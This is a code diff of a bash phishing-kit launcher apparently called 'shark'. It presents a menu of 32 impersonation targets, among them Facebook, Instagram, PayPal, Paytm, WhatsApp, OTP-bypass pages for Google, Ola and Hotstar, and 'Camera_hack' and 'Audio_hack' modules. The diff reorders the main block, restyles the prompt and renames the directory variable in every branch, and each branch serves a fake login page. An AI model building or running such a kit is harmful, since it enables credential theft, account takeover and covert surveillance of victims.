@@ -282,13 +282,6 @@ function url_shortner() {
 }
 	
 
-#######
-# MAIN
-#######
-
-os
-kill_ngrok
-
 while :
 do
 clear
@@ -319,17 +312,24 @@ printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m    
 printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n\n"
 printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n\n"
 printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n\n"
-printf "${purple}==================================================================${nc}\n"
+printf "${purple}==================================================================${nc}\n\n"
+read -p $'${blue} shark ${white}>> ${green}Choose Your Option :${nc}\n ' option
 }
 
-banner
-printf "\n"
 
-read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
+#######
+# MAIN
+#######
+
+os
+kill_ngrok
+banner
+
+
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
-	                    cd $phs/facebook/                            
+	                    cd $php/facebook/                            
                             echo 
 			    connection
 			    ( sleep 5 ) &> /dev/null & spin_shark
@@ -361,7 +361,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			     
 	 elif [ $option = 02 ] || [ $option = 2 ]
 	 then
-			   cd $phs/pinterest/                           
+			   cd $php/pinterest/                           
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -392,7 +392,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
 	 elif [ $option = 03 ] || [ $option = 3 ]
 	 then
-		           cd $phs/instagram/
+		           cd $php/instagram/
 			   echo 
 			   connection
 			   ( sleep 5 ) &> /dev/null & spin_shark
@@ -423,7 +423,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	elif [ $option = 04 ] || [ $option = 4 ]
         then
-                          cd $phs/UberEats-Phishing/
+                          cd $php/UberEats-Phishing/
 			  echo 
 			  connection
 			  ( sleep 5 ) &> /dev/null & spin_shark
@@ -454,7 +454,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			  
         elif [ $option = 05 ] || [ $option = 5 ]
         then
-                          cd $phs/ola-otpbypass/
+                          cd $php/ola-otpbypass/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -485,7 +485,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			  
          elif [ $option = 06 ] || [ $option = 6 ]
 	 then
-                          cd $phs/google-otp/                         
+                          cd $php/google-otp/                         
                           echo 
 			  connection
 		          ( sleep 5 ) &> /dev/null & spin_shark  
@@ -516,7 +516,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			  
        elif [ $option = 07 ] || [ $option = 7 ]
        then
-                          cd $phs/Paytm-Phishing/
+                          cd $php/Paytm-Phishing/
                           echo 
                           echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
 			  echo
@@ -587,7 +587,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
         elif [ $option = 08 ] || [ $option = 8 ]
 	then
 
-                          cd $phs/Netflix/
+                          cd $php/Netflix/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -618,7 +618,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
            elif [ $option = 09 ] || [ $option = 9 ]
 	   then
-                           cd $phs/instafollow/
+                           cd $php/instafollow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -649,7 +649,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
                elif [ $option = 10 ]
 	       then
-                           cd $phs/amazonsign/
+                           cd $php/amazonsign/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -680,7 +680,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                   elif [ $option = 11 ]
 	          then
-                           cd $phs/whatsapp-phishing/
+                           cd $php/whatsapp-phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -711,7 +711,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	          elif [ $option = 12 ]
 	          then
-                           cd $phs/Linkedin/
+                           cd $php/Linkedin/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -742,7 +742,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
    
                      elif [ $option = 13 ]
 	             then
-                           cd $phs/Hotstar-otp-bypass/
+                           cd $php/Hotstar-otp-bypass/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -773,7 +773,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
       
                     elif [ $option = 14 ]
 	            then
-                           cd $phs/spotify/
+                           cd $php/spotify/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -804,7 +804,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	            elif [ $option = 15 ]
 	            then
-                           cd $phs/github/
+                           cd $php/github/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -835,7 +835,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	        elif [ $option = 16 ]
 	        then
-                           cd $phs/ipfinder/
+                           cd $php/ipfinder/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -866,7 +866,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                   elif [ $option = 17 ]
 	          then
-                           cd $phs/Zomato-Phishing/
+                           cd $php/Zomato-Phishing/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -897,7 +897,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                    elif [ $option = 18 ]
 	           then
-                           cd $phs/phonepay/
+                           cd $php/phonepay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -928,7 +928,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	            elif [ $option = 19 ]
 	            then
-                           cd $phs/paypal/
+                           cd $php/paypal/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -959,7 +959,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
            
 	            elif [ $option = 20 ]
 	            then
-                           cd $phs/telegram/
+                           cd $php/telegram/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -990,7 +990,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	            elif [ $option = 21 ]
 	            then
-                           cd $phs/twitter/
+                           cd $php/twitter/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1021,7 +1021,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
                     
 		    elif [ $option = 22 ]
 	            then
-                          cd $phs/flipcart/
+                          cd $php/flipcart/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1052,7 +1052,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
        
                   elif [ $option = 23 ]
 	          then
-                          cd $phs/wordpress/
+                          cd $php/wordpress/
                           echo 
 			  connection
                           ( sleep 5 ) &> /dev/null & spin_shark
@@ -1083,7 +1083,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			  
 	           elif [ $option = 24 ]
 	           then
-                           cd $phs/snapchat/
+                           cd $php/snapchat/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1114,7 +1114,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 		    elif [ $option = 25 ]
 	            then
-                           cd $phs/protonmail/
+                           cd $php/protonmail/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1145,7 +1145,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                   elif [ $option = 26 ]
 	          then
-                           cd $phs/stackoverflow/
+                           cd $php/stackoverflow/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1176,7 +1176,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                   elif [ $option = 27 ]
 	          then
-                           cd $phs/ebay/
+                           cd $php/ebay/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1207,7 +1207,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 
                   elif [ $option = 28 ]
 	          then
-                           cd $phs/twitch/
+                           cd $php/twitch/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1238,7 +1238,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
                 
 		    elif [ $option = 29 ]
 	            then
-                           cd $phs/ajio/
+                           cd $php/ajio/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1269,7 +1269,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 		  elif [ $option = 30 ]
 	          then               
-                           cd $phs/mobikwik/
+                           cd $php/mobikwik/
                            echo 
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
@@ -1301,7 +1301,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 		  elif [ $option = 31 ]
 	          then        
 		           
-		           cd $phs/Camera_hack
+		           cd $php/Camera_hack
 			   file_check
 			   echo
 			   clear
@@ -1389,7 +1389,7 @@ read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
 			   
 	           elif [ $option = 32 ]
 	           then 
-		            cd $phs/Audio_hack
+		            cd $php/Audio_hack
 		            file_check
 			    echo
 			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
